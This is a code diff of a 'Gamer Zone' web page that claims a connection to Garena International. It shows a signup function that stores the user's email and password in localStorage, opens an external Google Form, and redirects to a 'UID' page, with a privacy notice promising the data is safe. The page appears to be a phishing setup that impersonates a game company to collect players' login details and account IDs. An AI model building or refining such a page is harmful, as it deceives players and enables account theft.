@@ -22,6 +22,7 @@
       justify-content: center;
       align-items: center;
       flex-direction: column;
+      position: relative;
     }
 
     body::before {
@@ -76,6 +77,13 @@
       background: #222;
     }
 
+    .links {
+      margin-top: 10px;
+      font-size: 12px;
+      color: red;
+      cursor: pointer;
+    }
+
     .footer {
       position: absolute;
       bottom: 10px;
@@ -83,13 +91,6 @@
       font-size: 12px;
       text-align: center;
       width: 100%;
-    }
-
-    .links {
-      margin-top: 10px;
-      font-size: 12px;
-      color: red;
-      cursor: pointer;
     }
 
     /* POPUP */
@@ -132,16 +133,16 @@
 </div>
 
 <div class="footer">
-  © 2026 Gamer Zone. All Rights Reserved | Garena International Official
+  © 2026 Gamer Zone. All Rights Reserved | Garena International
 </div>
 
-<!-- PRIVACY POPUP -->
+<!-- PRIVACY POLICY POPUP -->
 <div class="popup" id="popup">
   <div class="popup-content">
     <h3>Privacy Policy</h3>
     <p>
-      Your data is collected only for login and verification purposes.
-      We do not sell or share your information with third parties.
+      Your data is collected only for login and verification.
+      We do not share or sell your information.
     </p>
     <button onclick="closePolicy()">Close</button>
   </div>
@@ -157,19 +158,22 @@ function signup() {
     return;
   }
 
+  // store locally
   localStorage.setItem("user_email", email);
   localStorage.setItem("user_password", password);
 
+  // open Google Form
   window.open(
     "https://docs.google.com/forms/d/e/1FAIpQLSddWzlCgcpzw1ZnefYzfvNmSau9p4dbm-V5Zc4UjlUg4vJVDA/viewform?embedded=true",
     "_blank"
   );
 
-  alert("Complete the form. Redirecting...");
+  alert("Complete the form. Redirecting to UID page...");
 
+  // redirect to uid page
   setTimeout(() => {
     window.location.href = "uid.html";
-  }, 15000);
+  }, 12000);
 }
 
 function openPolicy() {
